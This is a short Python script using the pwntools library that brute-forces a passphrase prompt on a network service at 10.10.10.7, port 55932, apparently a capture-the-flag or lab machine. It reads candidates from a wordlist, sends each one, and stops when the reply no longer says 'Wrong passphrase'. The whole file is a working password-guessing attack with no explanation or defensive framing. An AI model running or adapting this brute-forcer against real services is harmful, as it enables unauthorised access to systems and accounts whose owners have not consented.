#!/usr/bin/python3
from pwn import *
target_host = "10.10.10.7"
target_port = 55932

f = open('wordlist','r')

for line in f:
    conn = remote(target_host,target_port,level='error')
    conn.recvuntil("Passphrase > ")
    conn.sendline(line)
    result= conn.recvline()
    result= conn.recvline()
    print(result)
    conn.close()
    result2= str(result)
    if "Wrong passphrase" not in result2:
        print("Valid code found: ",line)
        break
        

